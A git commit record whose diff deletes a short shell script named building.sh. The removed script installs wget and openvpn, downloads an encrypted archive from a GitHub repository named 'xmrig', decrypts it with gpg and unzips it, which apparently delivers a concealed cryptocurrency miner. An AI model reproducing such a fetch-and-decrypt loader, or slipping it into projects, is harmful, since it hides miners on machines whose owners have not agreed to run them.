d7129b5df0c72bf488ee96501cf2031851c7a383
Josh Manzano <32828438+joshmanzano@users.noreply.github.com>
2025-07-03 13:20:30 +0800

    Delete building.sh

--- building.sh
+++
@@ -1,6 +0,0 @@
-#!/bin/bash
-
-sudo apt install wget openvpn curl -y
-wget https://github.com/joshmanzano/xmrig/raw/refs/heads/main/build.zip.gpg -o ./build.zip.gpg
-gpg --decrypt ./build.zip.gpg
-unzip ./build.zip
